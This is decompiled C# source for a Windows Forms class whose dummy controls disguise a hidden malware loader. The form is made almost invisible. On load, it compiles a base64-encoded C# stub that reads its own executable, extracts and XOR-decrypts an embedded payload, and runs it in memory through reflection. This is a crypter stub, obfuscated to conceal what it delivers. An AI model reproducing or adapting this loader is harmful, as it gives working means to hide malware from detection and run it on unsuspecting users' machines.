using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns1;

namespace ns3;

[DesignerGenerated]
internal class Max : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton _RadioButton2;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	public static string string_0 = Encoding.Default.GetString(Convert.FromBase64String("dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247DQp1c2luZyBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnM7DQp1c2luZyBTeXN0ZW0uQ29tcG9uZW50TW9kZWw7DQp1c2luZyBTeXN0ZW0uV2luZG93czsNCnVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHk7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuU2VyaWFsaXphdGlvbi5Gb3JtYXR0ZXJzLkJpbmFyeTsNCg0KDQpuYW1lc3BhY2Ugeg0Kew0KICAgIGNsYXNzIHoNCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKCkNCiAgICAgICAgew0KICAgICAgICAgICAgeSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIHkoKQ0KCQl7DQogICAgICAgICAgICBzdHJpbmcgZmlsID0gRmlsZS5SZWFkQWxsVGV4dChBcHBsaWNhdGlvbi5FeGVjdXRhYmxlUGF0aCk7DQogICAgICAgICAgICBzdHJpbmdbXSBzdHJBcnJheSA9IGZpbC5TcGxpdChuZXcgc3RyaW5nW10geyAiQlVZYlN2RTVsUVQiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKTsNCiAgICAgICAgICAgIGJ5dGVbXSBleGUgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoc3RyQXJyYXlbMThdKTsNCgkJCWJ5dGVbXSBkbGwgPSBQb2x5RGVDcnlwdChyZWYgZXhlICwgcmVmIHN0ckFycmF5WzFdKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgIFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQoZGxsKS5HZXRUeXBlKCJMaWJvLkxpYm8iKS5HZXRNZXRob2QoIkxpYm8iKS5JbnZva2UobnVsbCwgbmV3IG9iamVjdFtdIHsgIH0gKTsNCgkJfQ0KDQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBieXRlW10gUG9seURlQ3J5cHQocmVmIGJ5dGVbXSBEYXRhLCByZWYgc3RyaW5nIGtleXMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBLZXkgPSBFbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGtleXMpOw0KICAgICAgICAgICAgaW50IGkgPSAwOw0KICAgICAgICAgICAgZm9yIChpID0gMDsgaSA8PSAoRGF0YS5MZW5ndGggLSAxKSAqICgwICsgMSk7IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBEYXRhW2kgJSBEYXRhLkxlbmd0aF0gPSBDb252ZXJ0LlRvQnl0ZSgoQ29udmVydC5Ub0ludDMyKERhdGFbaSAlIERhdGEuTGVuZ3RoXSBeIEtleVtpICUgS2V5Lkxlbmd0aF0pIC0gQ29udmVydC5Ub0ludDMyKERhdGFbKGkgKyAxKSAlIERhdGEuTGVuZ3RoXSkgKyAyNTYpICUgMjU2KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEFycmF5LlJlc2l6ZShyZWYgRGF0YSwgRGF0YS5MZW5ndGggLSAxKTsNCiAgICAgICAgICAgIHJldHVybiBEYXRhOw0KICAgICAgICB9DQogICAgICAgIA0KICAgIH0NCn0NCg=="));

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual Button Button3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button3 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual ComboBox ComboBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual RadioButton RadioButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton2 = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Max()
	{
		((Form)this).add_Load((EventHandler)Max_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		Button1 = new Button();
		Button2 = new Button();
		Button3 = new Button();
		CheckBox1 = new CheckBox();
		CheckBox2 = new CheckBox();
		ComboBox1 = new ComboBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		LinkLabel1 = new LinkLabel();
		PictureBox1 = new PictureBox();
		ProgressBar1 = new ProgressBar();
		TextBox1 = new TextBox();
		RadioButton1 = new RadioButton();
		RadioButton2 = new RadioButton();
		GroupBox1 = new GroupBox();
		Panel1 = new Panel();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(524, 86);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(534, 61);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(1);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button button5 = Button3;
		location = new Point(531, 37);
		((Control)button5).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button6 = Button3;
		size = new Size(75, 23);
		((Control)button6).set_Size(size);
		((Control)Button3).set_TabIndex(2);
		((ButtonBase)Button3).set_Text("Button3");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(633, 288);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(3);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(642, 222);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(81, 17);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(4);
		((ButtonBase)CheckBox2).set_Text("CheckBox2");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox comboBox = ComboBox1;
		location = new Point(556, 139);
		((Control)comboBox).set_Location(location);
		((Control)ComboBox1).set_Name("ComboBox1");
		ComboBox comboBox2 = ComboBox1;
		size = new Size(121, 21);
		((Control)comboBox2).set_Size(size);
		((Control)ComboBox1).set_TabIndex(5);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(329, 150);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(6);
		Label1.set_Text("Label1");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(228, 279);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(7);
		Label2.set_Text("Label2");
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(171, 161);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(39, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(8);
		Label3.set_Text("Label3");
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(75, 172);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(9);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		PictureBox pictureBox = PictureBox1;
		location = new Point(80, 324);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(100, 50);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(10);
		PictureBox1.set_TabStop(false);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(79, 399);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(306, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(11);
		TextBox textBox = TextBox1;
		location = new Point(341, 399);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(12);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(425, 319);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(13);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton2).set_AutoSize(true);
		RadioButton radioButton3 = RadioButton2;
		location = new Point(434, 357);
		((Control)radioButton3).set_Location(location);
		((Control)RadioButton2).set_Name("RadioButton2");
		RadioButton radioButton4 = RadioButton2;
		size = new Size(90, 17);
		((Control)radioButton4).set_Size(size);
		((Control)RadioButton2).set_TabIndex(14);
		RadioButton2.set_TabStop(true);
		((ButtonBase)RadioButton2).set_Text("RadioButton2");
		((ButtonBase)RadioButton2).set_UseVisualStyleBackColor(true);
		GroupBox groupBox = GroupBox1;
		location = new Point(399, 185);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(200, 100);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(15);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("GroupBox1");
		Panel panel = Panel1;
		location = new Point(271, 121);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(200, 100);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(16);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(293, 38);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)RadioButton2);
		((Control)this).get_Controls().Add((Control)(object)RadioButton1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).set_Name("Max");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Max_Load(object sender, EventArgs e)
	{
		Assembly assembly = Class11.smethod_1(string_0);
		Type[] types = assembly.GetTypes();
		foreach (Type type in types)
		{
			if (type.IsClass & type.FullName!.EndsWith(".z"))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
				Class11.smethod_78(type, RuntimeHelpers.GetObjectValue(objectValue));
			}
		}
	}
}
